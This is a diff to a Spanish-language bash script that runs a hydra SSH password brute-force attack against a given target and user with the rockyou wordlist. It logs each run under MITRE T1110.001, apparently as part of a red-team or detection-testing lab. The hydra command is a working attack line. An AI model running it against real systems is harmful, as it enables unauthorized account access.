@@ -11,6 +11,6 @@ WORDLIST="${3:-/usr/share/wordlists/rockyou.txt}"
 
 INICIO=$(log_inicio)
 echo "[+] Ejecutando fuerza bruta SSH contra ${TARGET} usuario ${USER}..."
-hydra -l "${USER}" -P "${WORDLIST}" -t 4 -f "ssh://${TARGET}" -o "/tmp/hydra_ssh_$(date +%s).log" || true
+hydra $(fam6 "$TARGET") -l "${USER}" -P "${WORDLIST}" -t 4 -f "ssh://$(brk "$TARGET")" -o "/tmp/hydra_ssh_$(date +%s).log" || true
 log_fin "bruteforce_ssh" "T1110.001" "${TARGET}" "${INICIO}" "1"
 echo "[+] Ataque registrado en log_ataques.csv"
